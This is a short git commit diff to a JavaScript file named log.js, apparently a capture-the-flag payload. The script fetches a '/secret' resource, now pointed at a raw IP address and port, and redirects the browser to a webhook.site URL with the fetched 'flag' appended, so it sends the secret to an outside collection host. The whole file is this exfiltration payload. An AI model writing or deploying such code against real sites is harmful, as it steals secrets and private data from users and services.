63195c23b2885344050f8a45678c365a786e9864
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2024-02-16 20:02:35 +0530

    Update log.js

--- js/log.js
+++ js/log.js
@@ -1,4 +1,4 @@
-fetch("/secret")
+fetch("http://20.235.243.131:8443/secret")
   .then(data => data.text())
   .then(flag => {
     window.location = "https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag=" + flag;
